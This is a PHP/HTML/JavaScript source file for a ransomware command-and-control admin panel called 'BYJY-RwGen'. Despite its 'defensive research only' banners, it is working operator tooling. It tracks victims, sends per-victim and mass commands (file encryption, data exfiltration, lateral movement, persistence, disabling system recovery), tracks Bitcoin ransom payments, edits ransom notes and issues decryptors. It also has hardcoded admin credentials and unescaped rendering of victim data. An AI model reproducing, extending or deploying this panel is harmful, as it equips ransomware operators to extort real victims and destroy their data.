<?php
/**
 * BYJY-RwGen C&C Admin Panel
 * Command and Control Server Administration Interface
 * For defensive cybersecurity research purposes only
 */

session_start();

// Security headers for research environment
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
header("X-XSS-Protection: 1; mode=block");

// Database configuration
require_once 'database.php';

// Authentication check
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    if ($_POST['username'] === 'admin' && $_POST['password'] === 'research2024!') {
        $_SESSION['authenticated'] = true;
        $_SESSION['user'] = 'admin';
        $_SESSION['login_time'] = time();
    } else {
        if ($_POST['username'] || $_POST['password']) {
            $error_message = "Invalid credentials for research panel";
        }
        // Show login form
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>BYJY-RwGen Research Panel - Login</title>
            <style>
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: linear-gradient(135deg, #1e3c72, #2a5298);
                    margin: 0; 
                    padding: 0; 
                    display: flex; 
                    justify-content: center; 
                    align-items: center; 
                    height: 100vh; 
                }
                .login-container {
                    background: rgba(255, 255, 255, 0.95);
                    padding: 40px;
                    border-radius: 15px;
                    box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
                    max-width: 400px;
                    width: 100%;
                }
                .warning-banner {
                    background: #ff6b6b;
                    color: white;
                    padding: 15px;
                    border-radius: 8px;
                    margin-bottom: 20px;
                    text-align: center;
                    font-weight: bold;
                }
                .form-group {
                    margin-bottom: 20px;
                }
                label {
                    display: block;
                    margin-bottom: 5px;
                    font-weight: 600;
                    color: #333;
                }
                input[type="text"], input[type="password"] {
                    width: 100%;
                    padding: 12px;
                    border: 2px solid #ddd;
                    border-radius: 8px;
                    font-size: 14px;
                    transition: border-color 0.3s;
                }
                input[type="text"]:focus, input[type="password"]:focus {
                    outline: none;
                    border-color: #2a5298;
                }
                .btn-primary {
                    width: 100%;
                    padding: 12px;
                    background: #2a5298;
                    color: white;
                    border: none;
                    border-radius: 8px;
                    font-size: 16px;
                    font-weight: 600;
                    cursor: pointer;
                    transition: background-color 0.3s;
                }
                .btn-primary:hover {
                    background: #1e3c72;
                }
                .error {
                    color: #e74c3c;
                    margin-top: 10px;
                    text-align: center;
                }
                .research-note {
                    background: #e8f4f8;
                    padding: 15px;
                    border-radius: 8px;
                    margin-top: 20px;
                    text-align: center;
                    font-size: 12px;
                    color: #2c3e50;
                }
            </style>
        </head>
        <body>
            <div class="login-container">
                <div class="warning-banner">
                    ⚠️ RESEARCH ENVIRONMENT ONLY ⚠️
                </div>
                <h2 style="text-align: center; color: #2c3e50; margin-bottom: 30px;">
                    BYJY-RwGen Research Panel
                </h2>
                <form method="POST">
                    <div class="form-group">
                        <label for="username">Username:</label>
                        <input type="text" id="username" name="username" required>
                    </div>
                    <div class="form-group">
                        <label for="password">Password:</label>
                        <input type="password" id="password" name="password" required>
                    </div>
                    <button type="submit" class="btn-primary">Login to Research Panel</button>
                    <?php if (isset($error_message)): ?>
                        <div class="error"><?php echo htmlspecialchars($error_message); ?></div>
                    <?php endif; ?>
                </form>
                <div class="research-note">
                    <strong>For Defensive Cybersecurity Research Only</strong><br>
                    This C&C panel simulates real ransomware infrastructure for security research and defense development.
                    Default credentials: admin / research2024!
                </div>
            </div>
        </body>
        </html>
        <?php
        exit;
    }
}

// Main admin panel
$db = new Database();

// Handle AJAX requests
if (isset($_GET['action']) && $_GET['action'] === 'api') {
    header('Content-Type: application/json');
    
    switch ($_GET['endpoint']) {
        case 'victims':
            $victims = $db->getVictims();
            echo json_encode($victims);
            break;
            
        case 'victim_details':
            $victim_id = $_GET['id'] ?? 0;
            $details = $db->getVictimDetails($victim_id);
            echo json_encode($details);
            break;
            
        case 'commands':
            $victim_id = $_GET['victim_id'] ?? 0;
            $commands = $db->getCommands($victim_id);
            echo json_encode($commands);
            break;
            
        case 'send_command':
            $victim_id = $_POST['victim_id'] ?? 0;
            $command = $_POST['command'] ?? '';
            $parameters = $_POST['parameters'] ?? '';
            
            $result = $db->sendCommand($victim_id, $command, $parameters);
            echo json_encode(['success' => $result]);
            break;
            
        case 'payments':
            $payments = $db->getPayments();
            echo json_encode($payments);
            break;
            
        case 'statistics':
            $stats = [
                'total_victims' => $db->getTotalVictims(),
                'active_victims' => $db->getActiveVictims(),
                'total_payments' => $db->getTotalPayments(),
                'total_revenue' => $db->getTotalRevenue(),
                'success_rate' => $db->getSuccessRate(),
                'avg_payment_time' => $db->getAveragePaymentTime()
            ];
            echo json_encode($stats);
            break;
            
        default:
            echo json_encode(['error' => 'Unknown endpoint']);
    }
    exit;
}

// Handle form submissions
if ($_POST['action'] ?? '') {
    switch ($_POST['action']) {
        case 'mass_command':
            $command = $_POST['command'];
            $victim_ids = $_POST['victim_ids'] ?? [];
            foreach ($victim_ids as $victim_id) {
                $db->sendCommand($victim_id, $command, '');
            }
            $success_message = "Command sent to " . count($victim_ids) . " victims";
            break;
            
        case 'update_ransom_note':
            $note_content = $_POST['ransom_note'];
            $db->updateRansomNote($note_content);
            $success_message = "Ransom note template updated";
            break;
            
        case 'generate_decryptor':
            $victim_id = $_POST['victim_id'];
            $decryption_key = $db->getVictimDecryptionKey($victim_id);
            $db->markPaymentReceived($victim_id);
            $success_message = "Decryptor generated for victim ID: " . $victim_id;
            break;
    }
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BYJY-RwGen Research C&C Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #1a1a1a;
            color: #e0e0e0;
            line-height: 1.6;
        }
        
        .header {
            background: linear-gradient(135deg, #2c1810, #8b4513);
            padding: 20px 0;
            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
        }
        
        .header-content {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .logo {
            font-size: 24px;
            font-weight: bold;
            color: #ff6b35;
        }
        
        .research-badge {
            background: #e74c3c;
            color: white;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .dashboard-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: #2d2d2d;
            padding: 20px;
            border-radius: 10px;
            border-left: 4px solid #ff6b35;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        
        .stat-title {
            font-size: 14px;
            color: #999;
            margin-bottom: 10px;
        }
        
        .stat-value {
            font-size: 32px;
            font-weight: bold;
            color: #ff6b35;
        }
        
        .tabs {
            display: flex;
            background: #2d2d2d;
            border-radius: 10px 10px 0 0;
            overflow: hidden;
        }
        
        .tab {
            padding: 15px 25px;
            background: #2d2d2d;
            color: #999;
            cursor: pointer;
            border: none;
            font-size: 14px;
            transition: all 0.3s;
        }
        
        .tab.active {
            background: #ff6b35;
            color: white;
        }
        
        .tab:hover {
            background: #ff8c66;
            color: white;
        }
        
        .tab-content {
            background: #2d2d2d;
            padding: 20px;
            border-radius: 0 0 10px 10px;
            min-height: 400px;
        }
        
        .tab-pane {
            display: none;
        }
        
        .tab-pane.active {
            display: block;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #444;
        }
        
        th {
            background: #1a1a1a;
            color: #ff6b35;
            font-weight: bold;
        }
        
        tr:hover {
            background: #3d3d3d;
        }
        
        .status-active {
            color: #27ae60;
            font-weight: bold;
        }
        
        .status-inactive {
            color: #e74c3c;
        }
        
        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            transition: all 0.3s;
            margin: 5px;
        }
        
        .btn-primary {
            background: #ff6b35;
            color: white;
        }
        
        .btn-primary:hover {
            background: #e55a2b;
        }
        
        .btn-success {
            background: #27ae60;
            color: white;
        }
        
        .btn-success:hover {
            background: #229954;
        }
        
        .btn-danger {
            background: #e74c3c;
            color: white;
        }
        
        .btn-danger:hover {
            background: #c0392b;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            color: #ff6b35;
            font-weight: 600;
        }
        
        input, select, textarea {
            width: 100%;
            padding: 10px;
            border: 1px solid #555;
            border-radius: 5px;
            background: #1a1a1a;
            color: #e0e0e0;
            font-size: 14px;
        }
        
        textarea {
            resize: vertical;
            height: 120px;
        }
        
        .alert {
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
            border-left: 4px solid;
        }
        
        .alert-success {
            background: #1b4332;
            border-left-color: #27ae60;
            color: #2ecc71;
        }
        
        .alert-danger {
            background: #4a1410;
            border-left-color: #e74c3c;
            color: #e74c3c;
        }
        
        .research-warning {
            background: #8b4513;
            color: #fff;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            text-align: center;
            border: 2px solid #ff6b35;
        }
        
        .command-history {
            max-height: 300px;
            overflow-y: auto;
            background: #1a1a1a;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
        }
        
        .command-entry {
            padding: 8px;
            margin-bottom: 5px;
            background: #2d2d2d;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }
        
        .timestamp {
            color: #999;
        }
        
        .victim-details {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .detail-item {
            background: #1a1a1a;
            padding: 15px;
            border-radius: 5px;
        }
        
        .detail-label {
            font-size: 12px;
            color: #999;
            margin-bottom: 5px;
        }
        
        .detail-value {
            font-weight: bold;
            color: #ff6b35;
        }
        
        .progress-bar {
            width: 100%;
            height: 20px;
            background: #1a1a1a;
            border-radius: 10px;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #ff6b35, #e55a2b);
            transition: width 0.3s ease;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-content">
            <div class="logo">🔒 BYJY-RwGen Research Panel</div>
            <div class="research-badge">⚠️ RESEARCH ENVIRONMENT</div>
        </div>
    </div>

    <div class="container">
        <div class="research-warning">
            <h3>🎓 DEFENSIVE CYBERSECURITY RESEARCH ENVIRONMENT</h3>
            <p>This C&C panel simulates real ransomware infrastructure for academic research and defense development purposes only. 
               All data is synthetic and operations are conducted in a controlled, authorized environment.</p>
        </div>

        <?php if (isset($success_message)): ?>
            <div class="alert alert-success"><?php echo htmlspecialchars($success_message); ?></div>
        <?php endif; ?>

        <div class="dashboard-grid" id="statistics">
            <div class="stat-card">
                <div class="stat-title">Total Victims</div>
                <div class="stat-value" id="total-victims">Loading...</div>
            </div>
            <div class="stat-card">
                <div class="stat-title">Active Sessions</div>
                <div class="stat-value" id="active-victims">Loading...</div>
            </div>
            <div class="stat-card">
                <div class="stat-title">Payments Received</div>
                <div class="stat-value" id="total-payments">Loading...</div>
            </div>
            <div class="stat-card">
                <div class="stat-title">Success Rate</div>
                <div class="stat-value" id="success-rate">Loading...</div>
            </div>
        </div>

        <div class="tabs">
            <button class="tab active" onclick="showTab('victims')">Victim Management</button>
            <button class="tab" onclick="showTab('commands')">Command Center</button>
            <button class="tab" onclick="showTab('payments')">Payment Tracking</button>
            <button class="tab" onclick="showTab('configuration')">Configuration</button>
            <button class="tab" onclick="showTab('analytics')">Analytics</button>
        </div>

        <div class="tab-content">
            <!-- Victims Tab -->
            <div id="victims" class="tab-pane active">
                <h3>Victim Systems (Research Targets)</h3>
                <table id="victims-table">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Hostname</th>
                            <th>IP Address</th>
                            <th>OS</th>
                            <th>First Seen</th>
                            <th>Last Heartbeat</th>
                            <th>Status</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody id="victims-tbody">
                        <tr>
                            <td colspan="8" style="text-align: center; color: #999;">Loading victim data...</td>
                        </tr>
                    </tbody>
                </table>
            </div>

            <!-- Commands Tab -->
            <div id="commands" class="tab-pane">
                <h3>Command Center</h3>
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
                    <div>
                        <h4>Send Command to Victim</h4>
                        <form id="command-form">
                            <div class="form-group">
                                <label>Target Victim:</label>
                                <select id="victim-select" name="victim_id">
                                    <option value="">Select victim...</option>
                                </select>
                            </div>
                            <div class="form-group">
                                <label>Command:</label>
                                <select name="command" id="command-select">
                                    <option value="encrypt_files">Encrypt Files</option>
                                    <option value="decrypt_files">Decrypt Files</option>
                                    <option value="collect_info">Collect System Info</option>
                                    <option value="exfiltrate_data">Exfiltrate Data</option>
                                    <option value="lateral_movement">Lateral Movement</option>
                                    <option value="persistence">Install Persistence</option>
                                    <option value="screenshot">Take Screenshot</option>
                                    <option value="self_destruct">Self Destruct</option>
                                </select>
                            </div>
                            <div class="form-group">
                                <label>Parameters:</label>
                                <textarea name="parameters" placeholder="Command parameters (JSON format)"></textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Send Command</button>
                        </form>
                    </div>
                    <div>
                        <h4>Mass Operations</h4>
                        <form method="POST">
                            <input type="hidden" name="action" value="mass_command">
                            <div class="form-group">
                                <label>Command:</label>
                                <select name="command">
                                    <option value="heartbeat">Request Heartbeat</option>
                                    <option value="update_config">Update Configuration</option>
                                    <option value="encrypt_network_drives">Encrypt Network Drives</option>
                                    <option value="disable_recovery">Disable System Recovery</option>
                                </select>
                            </div>
                            <div class="form-group">
                                <label>Target Victims:</label>
                                <div id="victim-checkboxes" style="max-height: 200px; overflow-y: auto;">
                                    <!-- Populated by JavaScript -->
                                </div>
                            </div>
                            <button type="submit" class="btn btn-danger">Execute Mass Command</button>
                        </form>
                    </div>
                </div>
                
                <div class="command-history">
                    <h4>Command History</h4>
                    <div id="command-history-content">
                        <!-- Populated by JavaScript -->
                    </div>
                </div>
            </div>

            <!-- Payments Tab -->
            <div id="payments" class="tab-pane">
                <h3>Payment Tracking & Bitcoin Management</h3>
                <table id="payments-table">
                    <thead>
                        <tr>
                            <th>Victim ID</th>
                            <th>Hostname</th>
                            <th>Demanded Amount (BTC)</th>
                            <th>Payment Address</th>
                            <th>Status</th>
                            <th>Payment Date</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody id="payments-tbody">
                        <tr>
                            <td colspan="7" style="text-align: center; color: #999;">Loading payment data...</td>
                        </tr>
                    </tbody>
                </table>
                
                <div style="margin-top: 30px;">
                    <h4>Generate Decryptor</h4>
                    <form method="POST">
                        <input type="hidden" name="action" value="generate_decryptor">
                        <div class="form-group">
                            <label>Victim ID (after payment verification):</label>
                            <input type="number" name="victim_id" required>
                        </div>
                        <button type="submit" class="btn btn-success">Generate & Send Decryptor</button>
                    </form>
                </div>
            </div>

            <!-- Configuration Tab -->
            <div id="configuration" class="tab-pane">
                <h3>Campaign Configuration</h3>
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
                    <div>
                        <h4>Ransom Note Template</h4>
                        <form method="POST">
                            <input type="hidden" name="action" value="update_ransom_note">
                            <div class="form-group">
                                <textarea name="ransom_note" rows="15" placeholder="Enter ransom note template..."><?php echo htmlspecialchars($db->getRansomNote()); ?></textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Update Template</button>
                        </form>
                    </div>
                    <div>
                        <h4>Campaign Settings</h4>
                        <div class="detail-item">
                            <div class="detail-label">Campaign ID</div>
                            <div class="detail-value">RESEARCH_CAMPAIGN_2024</div>
                        </div>
                        <div class="detail-item">
                            <div class="detail-label">C&C Domain</div>
                            <div class="detail-value">research-c2-server.local</div>
                        </div>
                        <div class="detail-item">
                            <div class="detail-label">Encryption Algorithm</div>
                            <div class="detail-value">XChaCha20-Poly1305</div>
                        </div>
                        <div class="detail-item">
                            <div class="detail-label">Payment Methods</div>
                            <div class="detail-value">Bitcoin (Research)</div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Analytics Tab -->
            <div id="analytics" class="tab-pane">
                <h3>Campaign Analytics & Intelligence</h3>
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px;">
                    <div class="stat-card">
                        <h4>Geographic Distribution</h4>
                        <div id="geographic-chart">
                            <!-- Chart would be rendered here -->
                            <div style="text-align: center; color: #999; padding: 40px;">
                                Geographic distribution chart<br>
                                (Research simulation data)
                            </div>
                        </div>
                    </div>
                    <div class="stat-card">
                        <h4>Infection Timeline</h4>
                        <div id="timeline-chart">
                            <div style="text-align: center; color: #999; padding: 40px;">
                                Infection timeline chart<br>
                                (Research simulation data)
                            </div>
                        </div>
                    </div>
                    <div class="stat-card">
                        <h4>Payment Analysis</h4>
                        <div class="detail-item">
                            <div class="detail-label">Average Payment Time</div>
                            <div class="detail-value" id="avg-payment-time">Loading...</div>
                        </div>
                        <div class="detail-item">
                            <div class="detail-label">Payment Success Rate</div>
                            <div class="detail-value" id="payment-success-rate">Loading...</div>
                        </div>
                        <div class="detail-item">
                            <div class="detail-label">Total Revenue (Research)</div>
                            <div class="detail-value" id="total-revenue">Loading...</div>
                        </div>
                    </div>
                    <div class="stat-card">
                        <h4>Security Bypass Statistics</h4>
                        <div class="detail-item">
                            <div class="detail-label">AV Detection Rate</div>
                            <div class="detail-value">12.5% (Research Target)</div>
                        </div>
                        <div class="detail-item">
                            <div class="detail-label">EDR Bypass Success</div>
                            <div class="detail-value">87.3% (Research Target)</div>
                        </div>
                        <div class="detail-item">
                            <div class="detail-label">Sandbox Evasion</div>
                            <div class="detail-value">94.1% (Research Target)</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Tab functionality
        function showTab(tabName) {
            // Hide all tab panes
            document.querySelectorAll('.tab-pane').forEach(pane => {
                pane.classList.remove('active');
            });
            
            // Remove active class from all tabs
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Show selected tab pane
            document.getElementById(tabName).classList.add('active');
            
            // Add active class to clicked tab
            event.target.classList.add('active');
        }

        // Load statistics
        function loadStatistics() {
            fetch('?action=api&endpoint=statistics')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('total-victims').textContent = data.total_victims || '0';
                    document.getElementById('active-victims').textContent = data.active_victims || '0';
                    document.getElementById('total-payments').textContent = data.total_payments || '0';
                    document.getElementById('success-rate').textContent = (data.success_rate || 0) + '%';
                    document.getElementById('avg-payment-time').textContent = (data.avg_payment_time || 0) + ' hours';
                    document.getElementById('payment-success-rate').textContent = (data.success_rate || 0) + '%';
                    document.getElementById('total-revenue').textContent = '$' + (data.total_revenue || 0).toLocaleString();
                })
                .catch(error => console.error('Error loading statistics:', error));
        }

        // Load victims
        function loadVictims() {
            fetch('?action=api&endpoint=victims')
                .then(response => response.json())
                .then(data => {
                    const tbody = document.getElementById('victims-tbody');
                    const select = document.getElementById('victim-select');
                    const checkboxes = document.getElementById('victim-checkboxes');
                    
                    tbody.innerHTML = '';
                    select.innerHTML = '<option value="">Select victim...</option>';
                    checkboxes.innerHTML = '';
                    
                    if (data.length === 0) {
                        tbody.innerHTML = '<tr><td colspan="8" style="text-align: center; color: #999;">No victims found (research environment)</td></tr>';
                        return;
                    }
                    
                    data.forEach(victim => {
                        // Table row
                        const row = tbody.insertRow();
                        row.innerHTML = `
                            <td>${victim.id}</td>
                            <td>${victim.hostname}</td>
                            <td>${victim.ip_address}</td>
                            <td>${victim.os_version}</td>
                            <td>${new Date(victim.first_seen).toLocaleString()}</td>
                            <td>${new Date(victim.last_heartbeat).toLocaleString()}</td>
                            <td><span class="${victim.status === 'active' ? 'status-active' : 'status-inactive'}">${victim.status}</span></td>
                            <td>
                                <button class="btn btn-primary" onclick="viewVictimDetails(${victim.id})">Details</button>
                                <button class="btn btn-success" onclick="sendQuickCommand(${victim.id}, 'heartbeat')">Ping</button>
                            </td>
                        `;
                        
                        // Select option
                        const option = document.createElement('option');
                        option.value = victim.id;
                        option.textContent = `${victim.hostname} (${victim.ip_address})`;
                        select.appendChild(option);
                        
                        // Checkbox
                        const checkbox = document.createElement('div');
                        checkbox.innerHTML = `
                            <label style="display: flex; align-items: center; margin-bottom: 10px;">
                                <input type="checkbox" name="victim_ids[]" value="${victim.id}" style="margin-right: 10px; width: auto;">
                                ${victim.hostname} (${victim.ip_address})
                            </label>
                        `;
                        checkboxes.appendChild(checkbox);
                    });
                })
                .catch(error => console.error('Error loading victims:', error));
        }

        // Send command
        document.getElementById('command-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const formData = new FormData(this);
            formData.append('action', 'api');
            formData.append('endpoint', 'send_command');
            
            fetch('?action=api&endpoint=send_command', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert('Command sent successfully (research simulation)');
                    loadCommandHistory();
                } else {
                    alert('Failed to send command');
                }
            })
            .catch(error => console.error('Error sending command:', error));
        });

        // Load command history
        function loadCommandHistory() {
            const historyContent = document.getElementById('command-history-content');
            
            // Simulate command history for research purposes
            const mockHistory = [
                { timestamp: new Date(), command: 'heartbeat', victim: 'research-vm-01', status: 'success' },
                { timestamp: new Date(Date.now() - 300000), command: 'collect_info', victim: 'research-vm-02', status: 'success' },
                { timestamp: new Date(Date.now() - 600000), command: 'encrypt_files', victim: 'research-vm-01', status: 'success' }
            ];
            
            historyContent.innerHTML = '';
            mockHistory.forEach(entry => {
                const div = document.createElement('div');
                div.className = 'command-entry';
                div.innerHTML = `
                    <span class="timestamp">[${entry.timestamp.toLocaleTimeString()}]</span> 
                    <strong>${entry.command}</strong> → ${entry.victim} 
                    <span style="color: ${entry.status === 'success' ? '#27ae60' : '#e74c3c'}">[${entry.status}]</span>
                `;
                historyContent.appendChild(div);
            });
        }

        // Send quick command
        function sendQuickCommand(victimId, command) {
            const formData = new FormData();
            formData.append('victim_id', victimId);
            formData.append('command', command);
            formData.append('parameters', '{}');
            
            fetch('?action=api&endpoint=send_command', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert(`${command} command sent successfully (research simulation)`);
                    loadCommandHistory();
                } else {
                    alert('Failed to send command');
                }
            })
            .catch(error => console.error('Error sending command:', error));
        }

        // View victim details
        function viewVictimDetails(victimId) {
            fetch(`?action=api&endpoint=victim_details&id=${victimId}`)
                .then(response => response.json())
                .then(data => {
                    let details = `
                        Victim Details (Research Data):
                        
                        ID: ${data.id}
                        Hostname: ${data.hostname}
                        IP Address: ${data.ip_address}
                        OS: ${data.os_version}
                        Domain: ${data.domain || 'Workgroup'}
                        First Seen: ${new Date(data.first_seen).toLocaleString()}
                        Last Heartbeat: ${new Date(data.last_heartbeat).toLocaleString()}
                        
                        System Info:
                        CPU Cores: ${data.cpu_count || 'Unknown'}
                        RAM: ${data.memory_gb || 'Unknown'} GB
                        Disk Space: ${data.disk_space_gb || 'Unknown'} GB
                        
                        Security:
                        Antivirus: ${data.antivirus || 'Unknown'}
                        Firewall: ${data.firewall || 'Unknown'}
                        
                        Files Encrypted: ${data.files_encrypted || 0}
                        Ransom Demanded: ${data.ransom_amount || 0} BTC
                        Payment Status: ${data.payment_status || 'Pending'}
                    `;
                    alert(details);
                })
                .catch(error => {
                    console.error('Error loading victim details:', error);
                    alert('Error loading victim details');
                });
        }

        // Initialize dashboard
        document.addEventListener('DOMContentLoaded', function() {
            loadStatistics();
            loadVictims();
            loadCommandHistory();
            
            // Auto-refresh every 30 seconds
            setInterval(() => {
                loadStatistics();
                loadVictims();
            }, 30000);
        });
    </script>
</body>
</html>
